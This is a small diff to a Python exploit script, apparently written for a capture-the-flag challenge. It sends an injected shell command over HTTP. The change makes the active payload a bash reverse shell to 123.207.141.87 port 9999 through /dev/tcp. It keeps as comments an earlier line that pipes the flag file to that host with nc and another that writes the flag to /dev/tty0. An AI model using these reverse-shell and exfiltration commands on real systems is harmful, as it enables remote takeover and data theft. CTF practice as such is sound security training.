@@ -27,8 +27,9 @@ def get_http(pwd, cmd):
 
 if __name__ == "__main__":
     pwd = get_pwd()
-    #  cmd = "ls | nc 123.207.141.87 9999;"
-    cmd = "cat flag | nc 123.207.141.87 9999;"
+    cmd = "bash -c 'sh -i >& /dev/tcp/123.207.141.87/9999 0>&1';"
+    #  cmd = "cat flag | nc 123.207.141.87 9999;"
+    #  cmd = "cat flag > /dev/tty0;"
     io.sendline(get_http(pwd, cmd))
 
     #  io.interactive()
